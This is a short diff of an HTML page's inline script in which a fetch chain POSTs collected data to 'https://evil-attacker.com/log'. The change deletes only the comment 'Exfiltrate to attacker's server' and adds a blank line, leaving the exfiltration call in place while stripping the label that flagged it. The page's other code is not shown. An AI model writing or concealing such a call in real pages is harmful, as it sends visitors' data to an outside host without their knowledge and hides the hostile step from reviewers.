@@ -15,7 +15,6 @@
     })
     .then(response => response.text())
     .then(data => {
-      // Exfiltrate to attacker's server
       fetch("https://evil-attacker.com/log", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -25,3 +24,4 @@
   </script>
 </body>
 </html>
+
